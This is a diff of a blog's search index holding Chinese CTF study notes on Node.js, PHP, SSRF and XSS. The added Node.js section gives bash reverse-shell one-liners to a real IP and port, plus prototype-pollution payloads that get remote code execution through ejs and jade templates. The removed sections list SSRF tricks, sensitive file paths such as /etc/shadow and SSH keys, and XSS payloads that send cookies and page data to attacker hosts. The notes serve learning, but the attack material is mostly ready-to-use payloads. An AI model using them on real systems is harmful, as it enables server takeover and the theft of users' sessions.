@@ -1,6 +1,115 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>nodejs</title>
+    <url>/2025/06/02/ctfshow/nodejs/</url>
+    <content><![CDATA[<h1 id="语法函数"><a href="#语法函数" class="headerlink" title="语法函数:"></a>语法函数:</h1><h2 id="1-eval-函数"><a href="#1-eval-函数" class="headerlink" title="1.eval()函数:"></a>1.eval()函数:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行 JS 表达式/代码字符串</span><br><span class="line">require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()     --普通的用于eval()</span><br><span class="line">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /app/routes/login.js&#x27;).toString()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th><code>eval()</code></th>
+<th><code>child_process.exec()</code> &#x2F; <code>execSync()</code> 等</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>功能</td>
+<td>执行 JS 表达式&#x2F;代码字符串</td>
+<td>执行系统命令，调用 shell</td>
+</tr>
+<tr>
+<td>执行环境</td>
+<td>JavaScript 运行时</td>
+<td>操作系统 shell（bash&#x2F;cmd）</td>
+</tr>
+<tr>
+<td>数据类型</td>
+<td>仅 JS 数据（字符串、对象等）</td>
+<td>任意系统命令输出（Buffer&#x2F;String）</td>
+</tr>
+<tr>
+<td>返回值</td>
+<td>JS 表达式的结果</td>
+<td>子进程的输出（stdout）</td>
+</tr>
+<tr>
+<td>安全风险</td>
+<td>高 —— 代码注入</td>
+<td>高 —— 命令注入</td>
+</tr>
+<tr>
+<td>CTF利用点</td>
+<td>SSTI、模板注入等可拼接 JS 表达式</td>
+<td>文件上传后配合执行；命令拼接</td>
+</tr>
+<tr>
+<td>防御建议</td>
+<td>禁用 <code>eval</code>；使用沙箱或 <code>vm</code> 模块</td>
+<td>参数白名单；转义特殊字符</td>
+</tr>
+</tbody></table>
+<h4 id="1-过滤"><a href="#1-过滤" class="headerlink" title="1.过滤:"></a>1.过滤:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;)</span><br><span class="line">require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;).stdout</span><br><span class="line">Buffer.from(input[, encoding])</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>input</td>
+<td>要转换的数据（字符串或数组）</td>
+</tr>
+<tr>
+<td>encoding</td>
+<td>编码方式（常用有：<code>utf8</code>, <code>base64</code>, <code>hex</code>, <code>binary</code>）</td>
+</tr>
+</tbody></table>
+<h2 id="2-res-render-函数"><a href="#2-res-render-函数" class="headerlink" title="2.res.render()函数:"></a>2.res.render()函数:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">render</span>(view, locals, callback)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>view</code></td>
+<td>模板名称（不带扩展名），如 <code>index</code></td>
+</tr>
+<tr>
+<td><code>locals</code></td>
+<td>传入模板的数据对象，如 <code>&#123;username: &#39;admin&#39;&#125;</code></td>
+</tr>
+<tr>
+<td><code>callback</code>（可选）</td>
+<td>如果提供，则不会自动发送响应，而是返回 HTML 字符串</td>
+</tr>
+</tbody></table>
+<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染:"></a>原型链污染:</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">能修改 <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>，就能影响所有对象</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-Functon"><a href="#1-Functon" class="headerlink" title="1.Functon()():"></a>1.Functon()():</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">传入bash去运行   bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">139.224</span><span class="number">.54</span><span class="number">.229</span>/<span class="number">9090</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">有可能需要两次bash： bash -c \<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;</span></span><br><span class="line"><span class="string">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1&#x27;)</span></span><br><span class="line"><span class="string">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-ejs的-rce"><a href="#2-ejs的-rce" class="headerlink" title="2.ejs的 rce:"></a>2.ejs的 rce:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">payload</span>:</span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-jade的rce"><a href="#3-jade的rce" class="headerlink" title="3.jade的rce:"></a>3.jade的rce:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Block&quot;</span>,<span class="string">&quot;nodes&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">注意:   <span class="title class_">Content</span>-<span class="title class_">Type</span>:application/json</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php特性</title>
     <url>/2025/06/02/ctfshow/php%E7%89%B9%E6%80%A7/</url>
     <content><![CDATA[<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="1-intval函数"><a href="#1-intval函数" class="headerlink" title="1.intval函数:"></a>1.intval函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数 <span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line">                如果数字前加一些字节，也不会影响进制转换    ---比如+<span class="number">010574</span>会被当成<span class="number">8</span>进制来转换</span><br><span class="line">                如果 base 是 <span class="number">0</span>，通过检测 value 的格式来决定使用的进制：</span><br><span class="line">                如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0b&quot;</span> (或 <span class="string">&quot;0B&quot;</span>) 开头，使用 <span class="number">2</span> 进制 (<span class="keyword">binary</span>)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">                将使用 <span class="number">10</span> 进制 (decimal)。</span><br><span class="line">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 <span class="keyword">int</span> 数值。   --可以通过类型转换</span><br><span class="line"><span class="title function_ invoke__">intval</span>() 不能用于 <span class="keyword">object</span>，否则会产生 E_NOTICE 错误并返回 <span class="number">1</span>。       --但是通过url，无法传递一个对象</span><br><span class="line">成功时返回 value 的 <span class="keyword">integer</span> 值，失败时返回 <span class="number">0</span>。 空的 <span class="keyword">array</span> 返回 <span class="number">0</span>，非空的 <span class="keyword">array</span> 返回 <span class="number">1</span>。    --?c[]=<span class="number">1</span>;就把c当作一个数组</span><br></pre></td></tr></table></figure>
@@ -189,1046 +298,6 @@
 </tr>
 </tbody></table>
 <h3 id="24-create-function-函数"><a href="#24-create-function-函数" class="headerlink" title="24.create_function()函数:"></a>24.create_function()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数已自 PHP <span class="number">7.2</span>.<span class="number">0</span> 起被废弃，并自 PHP <span class="number">8.0</span>.<span class="number">0</span> 起被移除。</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">string</span>    第一个</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ssrf</title>
-    <url>/2025/06/02/ctfshow/ssrf/</url>
-    <content><![CDATA[<h1 id="SSRF的运用原理"><a href="#SSRF的运用原理" class="headerlink" title="SSRF的运用原理:"></a>SSRF的运用原理:</h1><h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理:"></a>1.原理:</h2><p>利用存在漏洞的服务器，向内部或外部资源发送伪造的请求，从而达到以下目的：</p>
-<ul>
-<li>探测内网结构（端口扫描、服务发现）</li>
-<li>访问内网API（如云服务元数据接口）</li>
-<li>进行身份伪造（访问携带身份信息的资源）</li>
-<li>造成DoS、反弹请求等攻击</li>
-</ul>
-<h2 id="2-常用检测方法"><a href="#2-常用检测方法" class="headerlink" title="2.常用检测方法:"></a>2.常用检测方法:</h2><table>
-<thead>
-<tr>
-<th>检测类型</th>
-<th>方法</th>
-<th>描述</th>
-<th>检测是否成功的方式</th>
-<th>绕过思路</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>🌐 常见</td>
-<td><strong>访问内网地址</strong></td>
-<td>127.0.0.1、localhost、169.254.169.254、内网IP段等</td>
-<td>返回内容、响应时间差</td>
-<td>使用整数、16进制、<code>[::]</code>等变体绕过</td>
-</tr>
-<tr>
-<td>🌐 常见</td>
-<td><strong>DNSlog平台检测</strong></td>
-<td>传入外部 DNS 地址（如 <code>xx.ceye.io</code>）</td>
-<td>DNS平台记录到解析请求</td>
-<td>域名跳转、伪协议等规避安全策略</td>
-</tr>
-<tr>
-<td>🌐 常见</td>
-<td><strong>HTTP外带检测</strong></td>
-<td>构造 URL 发起外部 HTTP 请求</td>
-<td>服务器访问日志、Burp Collaborator、tcpdump</td>
-<td>基于 SSRF 的跳转链</td>
-</tr>
-<tr>
-<td>🌐 常见</td>
-<td><strong>文件协议</strong></td>
-<td>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 等</td>
-<td>如果读取内容返回，证明存在 SSRF</td>
-<td>file协议黑名单绕过、伪协议组合</td>
-</tr>
-<tr>
-<td>🌐 常见</td>
-<td><strong>gopher协议检测</strong></td>
-<td>构造 Redis 注入 &#x2F; SSRF-RCE</td>
-<td>返回内容为空，但配合后端验证成功</td>
-<td>被多数防火墙限制，注意协议混淆</td>
-</tr>
-<tr>
-<td>🌐 常见</td>
-<td><strong>请求延迟检测</strong></td>
-<td>访问 <code>http://10.0.0.1:81</code> 等，观察延迟</td>
-<td>请求阻塞 &#x2F; 超时 &#x2F; 响应慢</td>
-<td>用于端口扫描时做判断</td>
-</tr>
-<tr>
-<td>⚠️ 不常见</td>
-<td><strong>请求头注入检测</strong></td>
-<td>伪造 <code>Host</code>, <code>X-Forwarded-Host</code>, <code>X-Real-IP</code> 等</td>
-<td>后端错误信息中暴露 Host 信息</td>
-<td>配合 Host header 漏洞打 SSRF</td>
-</tr>
-<tr>
-<td>⚠️ 不常见</td>
-<td><strong>Open Redirect 联动检测</strong></td>
-<td>先跳转再 SSRF</td>
-<td>可被 SSRF 利用的 OpenRedirect</td>
-<td>常规过滤难以识别 URL 跳转链</td>
-</tr>
-<tr>
-<td>⚠️ 不常见</td>
-<td><strong>SVG 渲染触发 HTTP 请求</strong></td>
-<td>提交嵌入外链的 SVG，观察目标服务器是否发起请求</td>
-<td>需要精心构造图像并外带链接</td>
-<td>绕过非URL型白名单</td>
-</tr>
-<tr>
-<td>⚠️ 不常见</td>
-<td><strong>PDF生成功能 SSRF</strong></td>
-<td>提交带图像URL的 HTML，让服务器渲染 PDF 触发请求</td>
-<td>外部服务器或DNS记录</td>
-<td>PDF服务通常可执行外部请求</td>
-</tr>
-<tr>
-<td>⚠️ 不常见</td>
-<td><strong>OAuth&#x2F;SSO 重定向利用</strong></td>
-<td>借助SSO第三方回调URL发起 SSRF</td>
-<td>需要结合OAuth实现细节</td>
-<td>重定向 + SSRF合击链</td>
-</tr>
-<tr>
-<td>⚠️ 不常见</td>
-<td><strong>SMTP SSRF</strong></td>
-<td><code>smtp://127.0.0.1:25</code> 向邮件服务注入请求</td>
-<td>邮件被发送、行为侧信道</td>
-<td>多协议SSRF + 内网钓鱼链</td>
-</tr>
-</tbody></table>
-<h2 id="3-linxu常见敏感目录"><a href="#3-linxu常见敏感目录" class="headerlink" title="3.linxu常见敏感目录:"></a>3.linxu常见敏感目录:</h2><table>
-<thead>
-<tr>
-<th>路径</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>/etc/passwd</code></td>
-<td>用户信息（无密码）</td>
-</tr>
-<tr>
-<td><code>/etc/shadow</code></td>
-<td>加密密码（需root权限）</td>
-</tr>
-<tr>
-<td><code>/root/.ssh/id_rsa</code></td>
-<td>SSH私钥</td>
-</tr>
-<tr>
-<td><code>/var/www/html/config.php</code></td>
-<td>Web站点配置</td>
-</tr>
-<tr>
-<td><code>/proc/self/environ</code></td>
-<td>当前进程环境变量（可能泄漏Token）</td>
-</tr>
-<tr>
-<td><code>/proc/version</code></td>
-<td>内核版本信息</td>
-</tr>
-</tbody></table>
-<h2 id="4-对127-0-0-1的绕过"><a href="#4-对127-0-0-1的绕过" class="headerlink" title="4.对127.0.0.1的绕过:"></a>4.对127.0.0.1的绕过:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可以把域名的解析改到<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">    就能成功解析</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-通过302重定向的方法跳转"><a href="#5-通过302重定向的方法跳转" class="headerlink" title="5.通过302重定向的方法跳转:"></a>5.通过302重定向的方法跳转:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="6-通过标准的url结构绕过"><a href="#6-通过标准的url结构绕过" class="headerlink" title="6.通过标准的url结构绕过:"></a>6.通过标准的url结构绕过:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scheme://username:password@host:port/path?query#fragment</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="函数"><a href="#函数" class="headerlink" title="函数:"></a>函数:</h1><h2 id="1-curl-exec函数"><a href="#1-curl-exec函数" class="headerlink" title="1.curl_exec函数:"></a>1.curl_exec函数:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl_exec:把参数当作curl的参数传递</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xss</title>
-    <url>/2025/06/02/ctfshow/xss/</url>
-    <content><![CDATA[<h1 id="常见过滤"><a href="#常见过滤" class="headerlink" title="常见过滤:"></a>常见过滤:</h1><h2 id="如果使用了http-only"><a href="#如果使用了http-only" class="headerlink" title="如果使用了http-only:"></a>如果使用了http-only:</h2><h3 id="1-GET请求外带"><a href="#1-GET请求外带" class="headerlink" title="1.GET请求外带:"></a>1.GET请求外带:</h3><p>GET外带：</p>
- <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET方式外带接口返回的数据</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;接口&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>POST外带:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POST方式外带接口返回的数据</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="comment">// 发送到攻击者服务器</span></span><br><span class="line">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr2.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;https://attacker.com/post&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-POST请求外带"><a href="#2-POST请求外带" class="headerlink" title="2.POST请求外带:"></a>2.POST请求外带:</h3><p>GET外带：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. POST请求读取目标接口内容</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;a=1&amp;b=2&#x27;</span>); </span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>POST外带:</p>
-<h1 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法:"></a>利用手法:</h1><h2 id="1-xss原理的分析"><a href="#1-xss原理的分析" class="headerlink" title="1.xss原理的分析:"></a>1.xss原理的分析:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">向网站注入恶意JavaScript代码，让别人的浏览器在受信任的网页上下文中“执行攻击者的脚本”。</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-检测方式"><a href="#2-检测方式" class="headerlink" title="2. 检测方式:"></a>2. 检测方式:</h2><table>
-<thead>
-<tr>
-<th>场景&#x2F;说明</th>
-<th>Payload示例</th>
-<th>备注&#x2F;实战效果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>经典弹窗</td>
-<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td>判断能否插入原生JS</td>
-</tr>
-<tr>
-<td>双引号闭合</td>
-<td><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td>用于参数被包在引号里</td>
-</tr>
-<tr>
-<td>单引号闭合</td>
-<td><code>&#39;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td>同上</td>
-</tr>
-<tr>
-<td>img标签onerror</td>
-<td><code>&lt;img src=1 onerror=alert(1)&gt;</code></td>
-<td>绕过部分过滤，低版本IE必弹窗</td>
-</tr>
-<tr>
-<td>svg标签onload</td>
-<td><code>&lt;svg/onload=alert(1)&gt;</code></td>
-<td>对svg支持较弱站点，能绕标签限制</td>
-</tr>
-<tr>
-<td>body标签onload</td>
-<td><code>&lt;body onload=alert(1)&gt;</code></td>
-<td>HTML主体注入点</td>
-</tr>
-<tr>
-<td>input标签onfocus</td>
-<td><code>&lt;input autofocus onfocus=alert(1)&gt;</code></td>
-<td>页面插入input时测试</td>
-</tr>
-<tr>
-<td>a标签onclick</td>
-<td><code>&lt;a href=&quot;#&quot; onclick=alert(1)&gt;点我&lt;/a&gt;</code></td>
-<td>需用户操作</td>
-</tr>
-<tr>
-<td>script块注入</td>
-<td><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td>封闭script后再注入新的</td>
-</tr>
-<tr>
-<td>js事件属性（万能型）</td>
-<td><code>&lt;button onmouseover=alert(1)&gt;XSS&lt;/button&gt;</code></td>
-<td>鼠标事件型绕过</td>
-</tr>
-<tr>
-<td>html注释穿插</td>
-<td><code>&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</code></td>
-<td>盲测注释处理不严的模板</td>
-</tr>
-<tr>
-<td>盲打型payload</td>
-<td><code>&lt;img src=1 onerror=fetch(&#39;//你的域名/log?c=&#39;+document.cookie)&gt;</code></td>
-<td>无回显场景，后台日志收集</td>
-</tr>
-<tr>
-<td>反射测试</td>
-<td><code>&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;</code></td>
-<td>方便区分当前站点</td>
-</tr>
-<tr>
-<td>DOM型测试</td>
-<td><code>#&quot;&gt;&lt;script&gt;alert(document.location)&lt;/script&gt;</code></td>
-<td>DOM拼接位置必测</td>
-</tr>
-<tr>
-<td>href&#x2F;jump跳转型</td>
-<td><code>javascript:alert(1)</code></td>
-<td>测url跳转、链接、按钮</td>
-</tr>
-</tbody></table>
-<h2 id="3-常见img回流"><a href="#3-常见img回流" class="headerlink" title="3.常见img回流:"></a>3.常见img回流:</h2><h3 id="1-分类"><a href="#1-分类" class="headerlink" title="1.分类:"></a>1.分类:</h3><table>
-<thead>
-<tr>
-<th>场景&#x2F;目的</th>
-<th>payload示例</th>
-<th>说明&#x2F;攻防技巧</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>标准最常用</td>
-<td><code>&lt;img src=&quot;http://your.com/xss.php?cookie=&quot;+document.cookie&gt;</code></td>
-<td>简单直观，很多场景可用</td>
-</tr>
-<tr>
-<td>利用onerror事件</td>
-<td><code>&lt;img src=1 onerror=&quot;new Image().src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
-<td>兼容性强，可防止部分src过滤</td>
-</tr>
-<tr>
-<td>onerror多参数</td>
-<td><code>&lt;img src=x onerror=&quot;this.src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
-<td>利用自身src属性，无需new对象</td>
-</tr>
-<tr>
-<td>base64绕过</td>
-<td><code>&lt;img src=1 onerror=&quot;new Image().src=atob(&#39;aHR0cDovL3lvdXIuY29tL3hzcw==&#39;)+document.cookie&quot;&gt;</code></td>
-<td>避免明文URL被过滤</td>
-</tr>
-<tr>
-<td>多事件联合</td>
-<td><code>&lt;img src=1 onerror=&quot;document.body.appendChild(new Image()).src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
-<td>兼容部分内联过滤</td>
-</tr>
-<tr>
-<td>利用fetch</td>
-<td><code>&lt;img src=1 onerror=&quot;fetch(&#39;http://your.com/xss.php?cookie=&#39;+document.cookie)&quot;&gt;</code></td>
-<td>某些现代浏览器可用</td>
-</tr>
-<tr>
-<td>伪装UA等信息回流</td>
-<td><code>&lt;img src=&quot;http://your.com/xss.php?info=&quot;+navigator.userAgent+document.cookie&gt;</code></td>
-<td>携带更多信息</td>
-</tr>
-<tr>
-<td>GET+POST联合</td>
-<td><code>&lt;img src=1 onerror=&quot;var i=new Image();i.src=&#39;http://your.com/xss.php?c=&#39;+document.cookie&quot;&gt;</code></td>
-<td>多种变量名，规避WAF</td>
-</tr>
-</tbody></table>
-<h3 id="2-区别"><a href="#2-区别" class="headerlink" title="2.区别:"></a>2.区别:</h3><table>
-<thead>
-<tr>
-<th>payload类型</th>
-<th>隐蔽性</th>
-<th>兼容性</th>
-<th>是否跳转</th>
-<th>攻防用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>img+src</td>
-<td>高</td>
-<td>很高</td>
-<td>否</td>
-<td>首选，适合所有场景</td>
-</tr>
-<tr>
-<td>img+onerror</td>
-<td>很高</td>
-<td>极高</td>
-<td>否</td>
-<td>绕过滤</td>
-</tr>
-<tr>
-<td>location.href</td>
-<td>低</td>
-<td>高</td>
-<td>是</td>
-<td>测试&#x2F;盲打为主</td>
-</tr>
-<tr>
-<td>fetch&#x2F;xmlhttp</td>
-<td>中</td>
-<td>中高</td>
-<td>否</td>
-<td>现代浏览器为主</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>nodejs</title>
-    <url>/2025/06/02/ctfshow/nodejs/</url>
-    <content><![CDATA[<h1 id="语法函数"><a href="#语法函数" class="headerlink" title="语法函数:"></a>语法函数:</h1><h2 id="1-eval-函数"><a href="#1-eval-函数" class="headerlink" title="1.eval()函数:"></a>1.eval()函数:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行 JS 表达式/代码字符串</span><br><span class="line">require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()     --普通的用于eval()</span><br><span class="line">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /app/routes/login.js&#x27;).toString()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>特性</th>
-<th><code>eval()</code></th>
-<th><code>child_process.exec()</code> &#x2F; <code>execSync()</code> 等</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>功能</td>
-<td>执行 JS 表达式&#x2F;代码字符串</td>
-<td>执行系统命令，调用 shell</td>
-</tr>
-<tr>
-<td>执行环境</td>
-<td>JavaScript 运行时</td>
-<td>操作系统 shell（bash&#x2F;cmd）</td>
-</tr>
-<tr>
-<td>数据类型</td>
-<td>仅 JS 数据（字符串、对象等）</td>
-<td>任意系统命令输出（Buffer&#x2F;String）</td>
-</tr>
-<tr>
-<td>返回值</td>
-<td>JS 表达式的结果</td>
-<td>子进程的输出（stdout）</td>
-</tr>
-<tr>
-<td>安全风险</td>
-<td>高 —— 代码注入</td>
-<td>高 —— 命令注入</td>
-</tr>
-<tr>
-<td>CTF利用点</td>
-<td>SSTI、模板注入等可拼接 JS 表达式</td>
-<td>文件上传后配合执行；命令拼接</td>
-</tr>
-<tr>
-<td>防御建议</td>
-<td>禁用 <code>eval</code>；使用沙箱或 <code>vm</code> 模块</td>
-<td>参数白名单；转义特殊字符</td>
-</tr>
-</tbody></table>
-<h4 id="1-过滤"><a href="#1-过滤" class="headerlink" title="1.过滤:"></a>1.过滤:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;)</span><br><span class="line">require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;).stdout</span><br><span class="line">Buffer.from(input[, encoding])</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
